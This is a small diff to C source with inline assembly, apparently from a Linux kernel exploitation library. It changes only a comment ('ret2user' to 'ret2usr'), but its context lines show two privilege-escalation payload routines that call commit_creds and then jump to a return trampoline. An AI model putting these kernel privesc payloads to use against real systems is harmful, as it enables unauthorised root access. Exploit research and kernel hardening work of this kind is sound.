@@ -23,7 +23,7 @@ void _glb_privesc_kcred(void)
         "mov rdi, rax;"
         "movabs rax, " __stringify(COMMIT_CREDS_ADDR) ";"
         "call rax;"
-        // jmp to ret2user_trampoline or any return stub
+        // jmp to ret2usr_trampoline or any return stub
         "movabs rax, " __stringify(POST_PRIVESC_JUMP_ADDR) ";"
         "jmp rax;"
         ".att_syntax;"
@@ -48,7 +48,7 @@ void __privesc_kcred(uintptr_t commit_creds_addr,
         "mov rdi, rax;"
         "mov rax, %[cc];"
         "call rax;"
-        // jmp to ret2user_trampoline or any return stub
+        // jmp to ret2usr_trampoline or any return stub
         "mov rax, %[ret];"
         "jmp rax;"
         ".att_syntax;"
